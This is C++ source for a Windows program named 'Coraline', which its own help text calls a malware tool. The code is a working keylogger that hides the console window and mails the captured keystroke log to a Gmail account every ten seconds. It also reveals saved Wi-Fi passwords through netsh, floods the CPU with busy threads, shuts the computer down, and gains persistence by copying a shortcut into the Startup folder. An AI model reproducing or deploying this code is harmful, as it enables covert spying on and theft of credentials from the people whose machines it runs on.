//////////////////////////////////////////
// CORALINE ALL RIGHTS RESERVED @fnafyy_ap TESTER = @._apollonia
//////////////////////////////////////////

#define CHECK( hr ) { const HRESULT __hr = ( hr ); if( FAILED( __hr ) ) return __hr; }
#define _WIN32_WINNT 0x0500
#define MBR_SIZE 512
#include "thread.h"


using namespace EASendMailObjLib;
using namespace std;
using std::cout;
using std::flush;
using std::string;
using std::this_thread::sleep_for;
using std::chrono::milliseconds;

void main_loop();

void LOG(string input) {
	fstream LogFile;
	LogFile.open("win32.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case VK_OEM_PERIOD:
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		LOG("\b");
		return true;
	case VK_RBUTTON:
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		LOG("#TAB");
		return true;
	case VK_UP:
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}

void returning_to_menu();
void mail_no_logs();


bool sending_loop(string email)
{
	const int ConnectNormal = 0;
	const int ConnectSSLAuto = 1;
	const int ConnectSTARTTLS = 2;
	const int ConnectDirectSSL = 3;
	const int ConnectTryTLS = 4;

	const int optionOne = 1;
	const int optionTwo = 2;

	while (true)
	{

		::CoInitialize(NULL);

		IMailPtr oSmtp = NULL;
		oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
		oSmtp->LicenseCode = _T("TryIt");

		oSmtp->FromAddr = _T(""); //<--- YOUR CORALINE GMAIL

		oSmtp->AddRecipientEx(email.c_str(), 0);

		oSmtp->Subject = _T("Coraline");

		oSmtp->BodyFormat = 1;

		oSmtp->BodyText = _T("CORALINE");

		// attachment from disc
		oSmtp->AddAttachment(_T("./win32.txt")) != 0;


		oSmtp->ServerAddr = _T("smtp.gmail.com");

		oSmtp->UserName = _T("");     //<--- YOUR CORALINE GMAIL
		oSmtp->Password = _T(""); //<--- YOUR PASSWORD GMAIL

		oSmtp->ConnectType = ConnectTryTLS;


		oSmtp->SendMail() == 0;

		Sleep(10000);
	}
}

void mail_no_logs()
{
	const int ConnectNormal = 0;
	const int ConnectSSLAuto = 1;
	const int ConnectSTARTTLS = 2;
	const int ConnectDirectSSL = 3;
	const int ConnectTryTLS = 4;

	const int optionOne = 1;
	const int optionTwo = 2;

	int y;
	string email;

	cout << "EMAIL= " << endl;
	cin.ignore();
	getline(cin, email);


	thread start1(sending_loop, (email));
	thread start2(returning_to_menu);
	start1.join();
	start2.join();

}

void returning_to_menu()
{
	const int optionOne = 1;
	const int optionTwo = 2;

	int y;

	cout << "RETURN: 1" << endl;
	cout << "EXIT: 2" << endl;
	cin >> y;


	if (y == optionOne)
	{
		main_loop();
	}
	else if (y == optionTwo)
	{
		exit(0);
	}
	else
	{
		cout << "ERROR, NOT AVAIBLE OPTION" << endl;
		Sleep(2000);
		exit(0);
	}

}

void mail()
{
	const int ConnectNormal = 0;
	const int ConnectSSLAuto = 1;
	const int ConnectSTARTTLS = 2;
	const int ConnectDirectSSL = 3;
	const int ConnectTryTLS = 4;

	const int optionOne = 1;
	const int optionTwo = 2;

	int y;
	string email;

	cout << "EMAIL= " << endl;
	cin.ignore();
	getline(cin, email);


	while (true)
	{

		::CoInitialize(NULL);

		IMailPtr oSmtp = NULL;
		oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
		oSmtp->LicenseCode = _T("TryIt");

		oSmtp->FromAddr = _T(""); //<--- YOUR CORALINE GMAIL

		oSmtp->AddRecipientEx(email.c_str(), 0);

		oSmtp->Subject = _T("Coraline");

		oSmtp->BodyFormat = 1;

		oSmtp->BodyText = _T("CORALINE");

		// attachment from disc
		if (oSmtp->AddAttachment(_T("./win32.txt")) != 0)
		{
			_tprintf(_T("ERROR FILE: %s\r\n"),
				(const TCHAR*)oSmtp->GetLastErrDescription());
		}

		oSmtp->ServerAddr = _T("smtp.gmail.com");

		oSmtp->UserName = _T(""); //<--- YOUR CORALINE GMAIL
		oSmtp->Password = _T(""); //<--- YOUR PASSWORD GMAIL

		oSmtp->ConnectType = ConnectTryTLS;

		_tprintf(_T("SENDING\r\n"));

		if (oSmtp->SendMail() == 0)
		{
			_tprintf(_T("SENT\r\n"));
		}
		else
		{
			_tprintf(_T("SENT ERROR: %s\r\n"),
				(const TCHAR*)oSmtp->GetLastErrDescription());
		}

		Sleep(10000);
	}


	cout << "RETURN: 1" << endl;
	cout << "EXIT: 2" << endl;
	cin >> y;


	if (y == optionOne)
	{
		true;
	}
	else if (y == optionTwo)
	{
		exit(0);
	}
	else
	{
		cout << "ERROR, NOT AVAIBLE OPTION" << endl;
		Sleep(2000);
		exit(0);
	}
}

void slow_print(const string&, unsigned int);

void stress_01(void*)
{
	while (1)
	{
		clock_t wakeup = clock() + 50;
		while (clock() < wakeup) {}
		Sleep(50);
	}
}

//STRESS CPU
void secondThread()
{
	int ThreadNr;
	for (int i = 0; i < 4; i++) _beginthread(stress_01, 0, &ThreadNr);
	(void)getchar();
}

void thirdThread()
{
	do
	{
		cout << "STRESS" << endl;

		while (1)
		{
			clock_t wakeup = clock() + 50;
			while (clock() < wakeup) {}
			Sleep(50);
		}

	} while (true);
}

void loadingAnimation()
{
	cout << "LOADING";
	string message = "......\n";
	slow_print(message, 100);
}

//SHOWING WIFI PASSWORD
void wifi()
{
	const int optionOne = 1;
	const int optionTwo = 2;
	const int optionThree = 3;

	int y;
	string x;
	string y1;
	string y2;

	thread t1(loadingAnimation);
	t1.join();

	system("netsh wlan show profiles");

	cout << "2 WORDS PROFILE: 2\n1 WORD PROFILE: 1\n\nRETURN: 3" << endl;
	cin >> y;

	if (optionOne == y)
	{
		cout << "PROFILE: " << endl;
		cin >> x;
		system(("netsh wlan show profile " + x + " key=clear").c_str());
	}
	else if (optionTwo == y)
	{
		cout << "FIRST WORD OF PROFILE: " << endl;
		cin >> y1;
		cout << "SECOND WORD OF PROFILE: " << endl;
		cin >> y2;
		system(("netsh wlan show profile name=\"" + y1 + " " + y2 + "\" key=clear").c_str());
	}
	else if (optionThree == y)
	{
		main_loop();
	}
	else
	{
		cout << "ERROR, NOT AVAIBLE OPTION" << endl;
		Sleep(2000);
		exit(0);
	}
}


void logoCoraline()
{
	//konsola
	ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);

	string a;
	string text;
	string password;
	string liczba = to_string(0);


	string message = "WELCOME TO CORALINE\n\n";
	slow_print(message, 200);
	Sleep(2000);
	string message1 = "FIRST OF ALL, FOR YOUR SECURITY PLEASE SET YOUR PASSWORD: ";
	slow_print(message1, 50);
	cin >> a;

	ofstream file("x902.coraline");

	if (file.is_open())
	{
		file << a;
	}

	file.close();
	cout << "\n\n\n";
	cout << "               OOOOOOOOOOOOOOOOOkdox0000OOOOOOOkkxxdoloooollllllloodxkOOOOOkdc:ccclllloooooolooddddxkO00Oxx000000OO" << endl;
	cout << "               OOOOOOOOOOOOOOOOOOkkk000OO0OOOOOkkxddlcc::;;,,,,,,,,;codxddooolclllloloddodxxxxxddxxxxkO00O0000000OO" << endl;
	cout << "               OOOOOOOOOOOOOOOOOOOOO000OOOOOkkxolc:;,'.............',;;;;;,'',,:cloddolloddddddxxddxxxkkO00OO0000OO" << endl;
	cout << "               OOOOOOOOOOOOOOOOOOOO00OOkxdollc:;,,,,,''''......................';:lodolcclllc:cclccldoodkOOO00000OO" << endl;
	cout << "               OOOOOOOOOOOOOOOkkkkkxxdlcc:::;;;;;;;,,''.........................',,:dkOkdc:::;;;:cccllodkkO000000OO" << endl;
	cout << "               OOOOOOOOOOOOOOkkxdoc::;;;;;;;;;;;,,'.............''................',coool:'..',;:;::ccldkO000000OOO" << endl;
	cout << "               OOOOOOOOOOOkkdolc:;;,;;;;::;;,,,'..............'''...................'............',;:clxO000000OOOO" << endl;
	cout << "               OOOkOOOOOkdlc:;;,,,;;:::;;,''.................'..........'..........................';ldkO0O00OOOOOO" << endl;
	cout << "               OOOOkkkxl:;,,,,',,;;;;;,'....................'';:clloddxxxxxxxddolc;,.................;okkkkkkkkkkkk" << endl;
	cout << "               OOOkkxo:,;,,''',,,,,'''...................';:ldkOO00000000000000OOOOxdc;...............'codddddddddd" << endl;
	cout << "               kkkkkd:'''''',,'''''...................';coxkOO000000000000000000OOOOOkxo:'..............,clllllllll" << endl;
	cout << "               xkkkkd;..............................,:oxkOOO00000000000000000000OOOOOOkkxo;..............,:ccllllll" << endl;
	cout << "               xkkkkd;............................':okOOOO00000OOOOO000000000000OOOOOOkkkxd:.............';lllllooo" << endl;
	cout << "               xkkkkd;...........................,codddxOO00000OxddoooollllooooddxkOOOOkkkxo:.........  .'loooooooo" << endl;
	cout << "               xkkkkd:...........................,;::coxkOO0000OOOkkxdoollcccccccllodxkkkkxdo;.  ........,ooooooooo" << endl;
	cout << "               xkkkkxc...........................';coddxkOO00000OOOOkkxdoc;;;;;coxxxxkkkkkxxdl,.  .......':looooc::" << endl;
	cout << "               kxxkkxc'........................  ..,ldxxkkOO0000OOOOkkdc,.......,lkOOOOOkkkxdo:.   ......':ooool:,'" << endl;
	cout << "               kkxkkxl'.............................;dxxkkOO0000OOOOOkc..........,dOOOOOOkkxxdc'.  ......,coolll:;," << endl;
	cout << "               kkkkxdl,.............................,dkkkkkOO000O0OOOk:..........'oOOOOOOOkkxdl;.  ......;lollllc:;" << endl;
	cout << "               kkkkxdl;.................;:'........'lxkkkkOO000000000Oo'.......',ck0000OOOkkxdoc'  ......:llllllc:;" << endl;
	cout << "               kkkkxxo;................:ddl:,....':okkkOOkOO0000000000Od:''',,,;ok00000OOOOkxdoc,. .....,clllllc:;;" << endl;
	cout << "               kkkkxxo:...............,lddxxxdoddxkOOOOOOkkO0000K0000000Okddddxk000000OOOOOkxxol,. .....;lllllcc:::" << endl;
	cout << "               kkkkxddc..............'codxxkkkOOOOOOOOOkxdxkOOO0000K000000000000000000OOOOOkkxol,......'colllc:;,,," << endl;
	cout << "               kkkkxddl'.............,lddxkkkkOOOOOOOOkdodxkkkkOO00000000000000000000OOOOOOkkxol,......,looll:'...." << endl;
	cout << "               kkkkxddd;.............:oodxxkkkkkOOOOOkdllddxxxkkkkO0000000000000OOOOOOOOOkkkxxoc'......;oooooc,...." << endl;
	cout << "               kkkkkxdxc............':oodxxxkkkkkkOkkxollloodddxxkk00000000000OOOOOOOOOkkkkkxdo:. .....cddolol:'..." << endl;
	cout << "               kkkkkxdkd;...........':oodxxxxxxxkkkkkxxddddddxxkO000000000000OOOOOOOOOOOkkkkxdc'. .....:ddolc:,...." << endl;
	cout << "               kkkkkxxkkl'..........':lodxxxxdddxxkkkkkkkOOOO00000000000kkOOOkdxkOOOOOOOkkkxdo;.  .....,:ooc;'....." << endl;
	cout << "               kkkkkxxkkd;..........';lodxkkkxdoodxkkkkkOOOO0000OOOOOOOkkkkxdldk000OOOOkkkxxo:.   ......';cc,......" << endl;
	cout << "               kkkkkxxkkko,.........';cldxkkOOkdlccloooollllooolccccloddxdoodkO000OOOOkkkxdo:.    .......':l:......" << endl;
	cout << "               kkkkkxxkkkxl'........'';:ldxkkkkkxdl:;,;;;:::::cclllooooolldkOO00OOOOkkkxxdl;..   .........,:;'....." << endl;
	cout << "               kkxkkxkkkkkxl'.......'..,:lodxkkkkkkxoc:;;;;;::cccccc::coxkO00OOOOOOkkkxdoc'. .   ..........''...',," << endl;
	cout << "               kkxxxxkkkkkkkl,......'...';coddxxkkkkkkxolc::;:cllllldxkO000OOOOOkkkxxdoc,.....  ................':;" << endl;
	cout << "               xxxkxxkkkkkkkko;...........,:loddxxkkkkkkkkxxddxxkkOOO000OOOOOOkkkxxdl:'......   ................';," << endl;
	cout << "               kkkkkkkkkkkkkkkd;..........,cooloddxxkkkkkkOOOOOOOO0OOOOOOOOkkkkxxoc;...  ....  .................'''" << endl;
	cout << "               kkkkkkkkkkkkkkkxd;........,lxkkxdolodxxxkkkkOOOOOOOOOOOOOkkkkxxdol:,.............................''." << endl;
	cout << "               kkkkkkkkkkkkkkkkko,......,okkkkkxo::clodxxkkkkkkOOOOOOkkkkxxddddddo:.....   ........................" << endl;
	cout << "               kkkkkkkkkkkkkkxxkkl'.....'lkkkkko:;;,;;:codxxxkkkkkkkkxxxdddxxkkkxdc,.... .........................." << endl;
	cout << "               xxxxxxxxxxxkkkxxxkx:......':dkkxocc::;,''',;::cloooooddxxkkOOOkkkxkxc'.............................." << endl;
	cout << "               xxxxxxxxxxkkkkkkkkxd:.......:dxxxdoolllcc::::ccloddxxkOOOOOOOkkkkOOkl,'............................." << endl;
	cout << "               xxkkkkkkkkkkkkkkkkkko,......;dkkxxxxxxkkkkkkOOOOOOOOOOOOOOOOOO00OOOOl,,'...................'........" << endl;
	cout << "               xxkkkkkkkkkkkkkkkkkkko;.....':dxxxxxxxxxxxkkkkkkkkOOOOO00000K000000ko:;,'.......'''''.....''........" << endl;

	Sleep(2000);

	thread t1(loadingAnimation);
	t1.join();
	Sleep(1500);
}


//LOGO
void textTitOS()
{
	cout << "" << endl;

	string message = "CORALINE 4.2 ALPHA\n";
	slow_print(message, 50);
}

void key()
{
	char KEY = 'x';
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("win32.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}
}

void stresser_cpu()
{
	thread t2(secondThread);
	thread t3(thirdThread);
	thread t4(thirdThread);
	thread t5(thirdThread);
	thread t6(thirdThread);
	thread t7(thirdThread);
	thread t8(thirdThread);
	thread t9(thirdThread);
	thread t10(thirdThread);
	thread t11(thirdThread);
	thread t12(thirdThread);
	thread t13(thirdThread);
	thread t14(thirdThread);
	thread t15(thirdThread);
	thread t16(thirdThread);
	thread t17(thirdThread);
	thread t18(thirdThread);
	thread t19(thirdThread);
	thread t20(thirdThread);
	thread t21(thirdThread);
	thread t22(thirdThread);
	thread t23(thirdThread);
	thread t24(thirdThread);
	thread t25(thirdThread);
	thread t26(thirdThread);
	thread t27(thirdThread);
	thread t28(thirdThread);
	thread t29(thirdThread);
	thread t30(thirdThread);
	thread t31(thirdThread);
	thread t32(thirdThread);
	thread t33(thirdThread);
	thread t34(thirdThread);
	thread t35(thirdThread);
	thread t36(thirdThread);
	thread t37(thirdThread);
	thread t38(thirdThread);
	thread t39(thirdThread);

	t2.join();
	t3.join();
	t4.join();
	t5.join();
	t6.join();
	t7.join();
	t8.join();
	t9.join();
	t10.join();
	t11.join();
	t12.join();
	t13.join();
	t14.join();
	t15.join();
	t16.join();
	t17.join();
	t18.join();
	t19.join();
	t20.join();
	t21.join();
	t22.join();
	t23.join();
	t24.join();
	t25.join();
	t26.join();
	t27.join();
	t28.join();
	t29.join();
	t30.join();
	t31.join();
	t32.join();
	t33.join();
	t34.join();
	t35.join();
	t36.join();
	t37.join();
	t38.join();
	t39.join();
}

void shutDown()
{
	system("C:\\WINDOWS\\System32\\shutdown /s");
}

void autostart()
{
	string username;

	loadingAnimation();
	cout << "!!!REMEMBER!!! A FILE NAME \"CoralineSht.lnk\" IS REQUIRED FOR PROPER OPERATION OF THIS FUNCTION\n\n";
	Sleep(1500);

	cout << "YOUR USERNAME: \n";
	cin.ignore();
	getline(cin, username);

	system(("xcopy \"CoralineSht.lnk\" \"C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" ").c_str());

	cout << "\n";

}

void autostart1()
{
	thread start(autostart);
	start.join();


	const int optionOne = 1;
	const int optionTwo = 2;

	int y;

	cout << "RETURN: 1" << endl;
	cout << "EXIT: 2" << endl;
	cin >> y;


	if (y == optionOne)
	{
		true;
	}
	else
	{
		if (y == optionTwo)
		{
			exit(0);
		}
	}
}

void main_loop();

void shortcut()
{
	RegisterHotKey(NULL, 1, MOD_SHIFT, 0x43);

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		ShowWindow(GetConsoleWindow(), 1);
	}

}

void wifi1()
{
	ofstream outfile("load.bin");
	outfile << "2" << endl;
	outfile.close();

	thread t55(wifi);
	t55.join();

	const int optionOne = 1;
	const int optionTwo = 2;

	int y;

	cout << "RETURN: 1" << endl;
	cout << "EXIT: 2" << endl;
	cin >> y;

	if (y == optionOne)
	{
		main_loop();
	}
	else if (y == optionTwo)
	{
		exit(0);
	}
	else
	{
		cout << "ERROR, NOT AVAIBLE OPTION" << endl;
		Sleep(2000);
		exit(0);
	}
}

void main_loop()
{
	while (true)
	{
		ofstream outfile("load.bin");
		outfile << "0" << endl;
		outfile.close();

		textTitOS();

		cout << "" << endl;

		const int optionOne = 1;
		const int optionTwo = 2;
		const int optionThree = 3;
		const int optionFour = 4;
		const int optionFive = 5;
		const int optionSix = 6;
		const int optionSeven = 7;
		const int optionEight = 8;

		int x;

		string message = "Stresser CPU = 1\n";
		slow_print(message, 10);

		string message1 = "WIFI KEY SHOWER = 2\n";
		slow_print(message1, 10);

		string message2 = "SHUT DOWN COMPUTER = 3\n";
		slow_print(message2, 10);

		string message3 = "HIDING CONSOLE = 4\n";
		slow_print(message3, 10);

		string message4 = "KEYLOGGER = 5\n";
		slow_print(message4, 10);

		string message5 = "AUTOSTART = 6\n";
		slow_print(message5, 10);

		string message6 = "SENDING DATA OF KEYLOGGER TO MAIL = 7\n";
		slow_print(message6, 10);

		string message7 = "INFO/HELP = 8\n";
		slow_print(message7, 10);

		cin >> x;


		if (x == optionOne)							//STRESSER CPU
		{
			const int optionOne = 1;
			const int optionTwo = 2;

			cout << "SHOW WINDOW?\nNO:1\nYES:2" << endl;
			cin >> x;

			if (x == optionOne)
			{
				ShowWindow(GetConsoleWindow(), 0);
				stresser_cpu();
			}
			else if (x == optionTwo)
			{
				ShowWindow(GetConsoleWindow(), 1);
				stresser_cpu();
			}
			else
			{
				cout << "ERROR, NOT AVAIBLE OPTION" << endl;
				Sleep(2000);
				exit(0);
			}

		}
		else if (x == optionTwo)					//WIFI KEY
		{
			ofstream outfile("load.bin");
			outfile << "2" << endl;
			outfile.close();

			wifi1();
		}
		else if (x == optionThree)					//SHUTDOWN
		{
			shutDown();
		}
		else if (x == optionFour)					//HIDING CONSOLE
		{
			ShowWindow(GetConsoleWindow(), 0);
		}
		else if (x == optionFive)					//KEYLOGGER
		{
			ofstream outfile("load.bin");
			outfile << "5" << endl;
			outfile.close();

			const int optionOne = 1;
			const int optionTwo = 2;

			cout << "SHOW WINDOW?\nNO:1\nYES:2" << endl;
			cin >> x;

			if (x == optionOne)
			{

				ofstream outfile("load.bin");
				outfile << "55" << endl;
				outfile.close();

				ShowWindow(GetConsoleWindow(), 0);

				thread key(key);
				thread start2(returning_to_menu);
				thread shortcut(shortcut);
				shortcut.join();
				key.join();
				start2.join();

			}
			else if (x == optionTwo)
			{
				ShowWindow(GetConsoleWindow(), 1);

				thread key(key);
				thread loop(main_loop);
				key.join();
				loop.join();
			}
			else
			{
				cout << "ERROR, NOT AVAIBLE OPTION" << endl;
				Sleep(2000);
				exit(0);
			}
		}
		else if (x == optionSix)						//AUTOSTARTING APLICATION
		{
			thread start(autostart1);
			start.join();
		}
		else if (x == optionSeven)					//MAILING DATA FROM KEYLOGGER
		{
			int optionOne = 1;
			int optionTwo = 2;

			cout << "SHOW LOGS?\nNO:1\nYES:2" << endl;
			cin >> x;

			if (x == optionOne)
			{
				cout << "SHOW WINDOW?\nNO:1\nYES:2" << endl;
				cin >> x;

				if (x == optionOne)
				{
					ShowWindow(GetConsoleWindow(), 0);

					thread start(mail_no_logs);
					start.join();
				}
				else if (x == optionTwo)
				{
					ShowWindow(GetConsoleWindow(), 1);

					thread start(mail_no_logs);
					start.join();
				}
				else
				{
					cout << "ERROR, NOT AVAIBLE OPTION" << endl;
					Sleep(2000);
					exit(0);
				}
			}
			else if (x == optionTwo)
			{
				cout << "SHOW WINDOW?\nNO:1\nYES:2" << endl;
				cin >> x;

				if (x == optionOne)
				{
					ShowWindow(GetConsoleWindow(), 0);

					thread start(mail);
					start.join();
				}
				else if (x == optionTwo)
				{
					ShowWindow(GetConsoleWindow(), 1);

					thread start(mail);
					start.join();
				}
				else
				{
					cout << "ERROR, NOT AVAIBLE OPTION" << endl;
					Sleep(2000);
					exit(0);
				}
			}
			else
			{
				cout << "ERROR, NOT AVAIBLE OPTION" << endl;
				Sleep(2000);
				exit(0);
			}

			cout << "SHOW WINDOW?\nNO:1\nYES:2" << endl;
			cin >> x;

			if (x == optionOne)
			{
				ShowWindow(GetConsoleWindow(), 0);

				thread start(mail);
				start.join();
			}
			else if (x == optionTwo)
			{
				ShowWindow(GetConsoleWindow(), 1);

				thread start(mail);
				start.join();
			}
		}
		else if (x == optionEight)
		{
			cout << "Coraline is a simple Malware Tool made by FnafyyTheArchitect\nHow to use? Choose an option by writing one number between 1 and 8\nProgram is still in progress\nFor most common bugs and problems, just delete \"load.bin\"\nWhen keylogger is minimized click SHIFT+C to maximaze again\n\nA FILE NAME \"CoralineSht.lnk\" IS REQUIRED FOR PROPER OPERATION OF THIS FUNCTION | U HAVE TO CREATE A SHORTCUT FROM \"Coraline.exe\", NEXT RENAME IT WITH \"CoralineSht\"\n\n";
			returning_to_menu();
		}
		else
		{
			cout << "ERROR, NOT AVAIBLE OPTION" << endl;
			Sleep(2000);
			exit(0);
		}
	}

}

int main()
{
	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hStdOut, FOREGROUND_RED);

	SetConsoleTitle(TEXT("Coraline.exe"));


	string myText;
	string x = to_string(6);
	string y = to_string(5);
	string v = to_string(2);
	string z = to_string(0);
	string vv = to_string(55);

	ifstream MyReadFile("load.bin");

	while (getline(MyReadFile, myText)) {
		if (x == myText)
		{
			thread start(autostart1);
			start.join();
		}
		else if (y == myText)
		{
			ShowWindow(GetConsoleWindow(), 0);
			thread key(key);
			key.join();
		}
		else if (v == myText)
		{
			thread start(wifi1);
			start.join();
		}
		else if (z == myText)
		{
			string password;
			string a;

			cout << "PASSWORD: " << endl;
			cin >> a;

			ifstream readFile("x902.coraline");

			while (getline(readFile, password))
			{
				if (password == a)
				{
					thread start(main_loop);
					start.join();
				}
				else
				{
					cout << "PASSWORD INCORRECT, ACCESS DENIED" << endl;

					Sleep(2000);

					return 0;
				}
			}


		}
		else if (vv == myText)
		{
			ShowWindow(GetConsoleWindow(), 0);

			thread start(key);
			start.join();
		}
	}

	MyReadFile.close();

	logoCoraline();

	main_loop();
}



void slow_print(const string& message, unsigned int millis_per_char)
{
	for (const char c : message)
	{
		cout << c << flush;

		sleep_for(milliseconds(millis_per_char));
	}
}